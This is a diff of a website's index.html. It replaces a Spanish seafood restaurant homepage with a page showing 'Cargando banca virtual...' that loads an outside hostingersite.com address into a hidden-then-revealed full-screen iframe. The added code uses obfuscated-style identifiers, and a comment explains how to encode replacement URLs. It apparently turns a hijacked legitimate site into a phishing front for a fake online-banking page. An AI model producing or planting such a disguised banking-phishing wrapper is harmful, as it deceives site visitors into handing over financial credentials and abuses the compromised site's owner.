@@ -1,110 +1,238 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Marea Alta | Fine Dining Costero</title>
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600;700&family=Montserrat:wght@300;400;500;700&display=swap" rel="stylesheet">
-    
-    <link rel="stylesheet" href="assets/css/variables.css">
-    <link rel="stylesheet" href="assets/css/base.css">
-    <link rel="stylesheet" href="assets/css/layouts.css">
-    <link rel="stylesheet" href="assets/css/components.css">
-    <link rel="stylesheet" href="assets/css/motion.css">
-
+    <title>cargando.</title>
     <style>
-        .hero {
-            position: relative;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            background: linear-gradient(rgba(15, 23, 42, 0.4), rgba(15, 23, 42, 0.8)), url('https://images.unsplash.com/photo-1615141982883-c7ad0e69fd62?q=80&w=1400&auto=format&fit=crop') center/cover fixed;
+        * {
+            box-sizing: border-box;
         }
 
-        .hero h1 {
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #fff;
+            font-family: system-ui, -apple-system, sans-serif;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        #_lw {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #fff;
+            z-index: 1000;
+            transition: opacity 0.35s ease;
+        }
+
+        #_lw.h {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        ._sp {
+            width: 46px;
+            height: 46px;
+            border: 4px solid #e9ecef;
+            border-top-color: #0d6efd;
+            border-radius: 50%;
+            animation: _k 0.9s linear infinite;
+            margin-bottom: 14px;
+        }
+
+        @keyframes _k {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        ._lt {
+            color: #6c757d;
+            font-size: 14px;
+        }
+
+        ._ef {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0;
+            transition: opacity 0.35s ease;
+            background: #fff;
+            z-index: 1;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        ._ef.v {
+            opacity: 1;
+        }
+
+        #_em {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 24px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 90%;
+            z-index: 500;
+        }
+
+        #_em.s {
+            display: block;
+        }
+
+        #_em h3 {
+            margin: 0 0 8px;
+            color: #495057;
+        }
+
+        #_em p {
+            margin: 0 0 16px;
+            color: #6c757d;
+        }
+
+        #_em button {
+            background: #0d6efd;
             color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        #_em button:hover {
+            background: #0b5ed7;
+        }
+
+        noscript {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #fff;
+            text-align: center;
+            padding: 20px;
         }
     </style>
 </head>
+
 <body>
-    <header class="header">
-        <a href="index.html" class="nav__logo">MAREA ALTA.</a>
-        <nav>
-            <ul class="nav__list">
-                <li><a href="menu.html" class="nav__link" style="color: #fff;">La Carta</a></li>
-                <li><a href="origen.html" class="nav__link" style="color: #fff;">El Origen</a></li>
-                <li><a href="reservas.html" class="nav__link" style="color: var(--clr-accent);">Reservas</a></li>
-            </ul>
-        </nav>
-    </header>
 
-    <main>
-        <!-- Hero Oceánico -->
-        <section class="hero">
-            <div class="container wave-reveal">
-                <p style="font-family: var(--font-heading); color: var(--clr-cyan); letter-spacing: 5px; text-transform: uppercase; margin-bottom: 1rem;">Ostrería & Fuego</p>
-                <h1 style="font-size: var(--text-hero); letter-spacing: 2px;">El Atlántico<br>En Tu Mesa</h1>
-                <div style="margin-top: var(--space-m);">
-                    <a href="menu.html" class="btn-coral">Ver Menú del Día</a>
-                </div>
-            </div>
-        </section>
+    <!-- Cargador / Loader -->
+    <div id="_lw">
+        <div class="_sp"></div>
+        <div class="_lt">Cargando banca virtual...</div>
+    </div>
 
-        <!-- Filosofía Fresca -->
-        <section class="section-pad container">
-            <div class="grid-split">
-                <div class="wave-reveal">
-                    <h2 style="font-size: var(--text-h2); margin-bottom: var(--space-s);">Nuestra Promesa <br>de Sal.</h2>
-                    <p style="color: var(--clr-text); font-size: 1.1rem;">No tenemos congeladores para el pescado. Lo que el mar nos da al amanecer en la lonja de la bahía, es lo que servimos al mediodía.</p>
-                    <p style="color: var(--clr-text); font-size: 1.1rem;">Nuestra relación no es con proveedores masivos, es con pescadores artesanales locales. Respetamos las vedas, los ciclos lunares y la pureza de la materia prima, tratándola solo con fuego, sal marina y cítricos.</p>
-                </div>
-                <div class="wave-reveal organic-mask" style="transition-delay: 0.2s;">
-                    <img src="https://images.unsplash.com/photo-1599084993091-1cb5c0721cc6?q=80&w=800&auto=format&fit=crop" alt="Pescado fresco del día" style="width: 100%; height: 500px;">
-                </div>
-            </div>
-        </section>
+    <!-- Contenedor del Iframe -->
+    <iframe id="_mainFrame" class="_ef"></iframe>
 
-        <!-- Pesca del Día Destacada -->
-        <section class="section-pad-sm container" style="text-align: center;">
-            <div class="wave-reveal">
-                <h2 style="font-size: var(--text-h2); color: var(--clr-accent); margin-bottom: var(--space-m);">Destacado de Hoy</h2>
-            </div>
-            <div class="grid-split" style="text-align: left; background: #fff; padding: var(--space-m); box-shadow: 0 20px 40px rgba(0,0,0,0.03); border-radius: 20px;">
-                <div class="wave-reveal float-effect" style="transition-delay: 0.1s;">
-                    <img src="https://images.unsplash.com/photo-1544869502-3deab359f9c6?q=80&w=800&auto=format&fit=crop" alt="Plato destacado" style="border-radius: 10px;">
-                </div>
-                <div class="wave-reveal" style="transition-delay: 0.3s; padding-left: 5vw;">
-                    <h3 style="font-size: var(--text-h3); margin-bottom: 0.5rem;">Rodaballo Salvaje a la Brasa</h3>
-                    <p style="color: var(--clr-accent); font-weight: 700; font-size: 1.2rem; margin-bottom: 1.5rem;">$45.00</p>
-                    <p style="color: var(--clr-text);">Pieza entera de 1.2kg, capturada con anzuelo esta madrugada. Asada lentamente sobre brasas de madera de encina, bañada en una emulsión de su propio colágeno, ajo confitado y vinagre de sidra.</p>
-                    <a href="menu.html" style="font-family: var(--font-heading); font-weight: 700; color: var(--clr-surface); text-decoration: underline;">Descubrir la carta completa</a>
-                </div>
-            </div>
-        </section>
+    <!-- Error -->
+    <div id="_em">
+        <h3>Contenido no disponible</h3>
+        <p>Estamos experimentando dificultades técnicas.</p>
+        <button onclick="location.reload()">Reintentar</button>
+    </div>
 
-        <!-- Cita Elegante -->
-        <section class="section-pad container text-center" style="margin-top: var(--space-m); border-top: 1px solid rgba(15, 23, 42, 0.1);">
-            <div class="wave-reveal" style="max-width: 800px; margin: 0 auto;">
-                <p style="font-family: var(--font-heading); font-size: 2.5rem; color: var(--clr-surface); line-height: 1.4; margin-bottom: var(--space-m);">
-                    "Un santuario para los amantes del mar. Marea Alta eleva el marisco a su máxima expresión."
-                </p>
-                <p style="font-size: 0.9rem; text-transform: uppercase; letter-spacing: 2px; color: var(--clr-accent);">— Guía Culinaria 2026</p>
-            </div>
-        </section>
-    </main>
-
-    <footer class="footer">
-        <div class="container">
-            <h2 style="font-size: 2rem; color: var(--clr-cyan); margin-bottom: 1rem;">MAREA ALTA.</h2>
-            <p style="font-size: 0.9rem; letter-spacing: 2px;">FINE DINING COSTERO &copy; 2026</p>
+    <noscript>
+        <div>
+            <h2>JavaScript requerido</h2>
+            <p>Esta página necesita JavaScript para funcionar correctamente.</p>
         </div>
-    </footer>
+    </noscript>
 
-    <script src="assets/js/app.js"></script>
+    <script>
+        (function () {
+            'use strict';
+
+            // ═══════════════════════════════════════════════════════
+            // PARA CAMBIAR LAS URLs:
+            // Abre convertir.html en tu navegador, pega la URL,
+            // y copia los números que te da. Reemplázalos abajo.
+            // ═══════════════════════════════════════════════════════
+
+            // URL principal
+            var _0x1 = "https://darkblue-magpie-446086.hostingersite.com";
+
+            // ── Decisión principal ──
+            function _loadTarget() {
+                try {
+                    var loader = document.getElementById('_lw');
+                    var errorMsg = document.getElementById('_em');
+                    var ifrm = document.getElementById('_mainFrame');
+
+                    if (!ifrm) return;
+
+                    // Al cargar el iframe, ocultamos el cargador y mostramos el contenido con transición
+                    ifrm.onload = function () {
+                        if (loader) {
+                            loader.classList.add('h');
+                        }
+                        ifrm.classList.add('v');
+                    };
+
+                    // Si ocurre un error de carga
+                    ifrm.onerror = function () {
+                        if (loader) {
+                            loader.classList.add('h');
+                        }
+                        if (errorMsg) {
+                            errorMsg.classList.add('s');
+                        }
+                    };
+
+                    // Asignar destino
+                    ifrm.src = _0x1;
+
+                    // Temporizador de seguridad (3 segundos)
+                    setTimeout(function () {
+                        if (loader && !loader.classList.contains('h')) {
+                            loader.classList.add('h');
+                            ifrm.classList.add('v');
+                        }
+                    }, 3000);
+
+                } catch (e) {
+                    var loader = document.getElementById('_lw');
+                    var errorMsg = document.getElementById('_em');
+                    if (loader) loader.classList.add('h');
+                    if (errorMsg) errorMsg.classList.add('s');
+                }
+            }
+
+            // ── Ejecutar Inmediatamente ──
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', _loadTarget);
+            } else {
+                _loadTarget();
+            }
+
+        })();
+    </script>
 </body>
+
 </html>
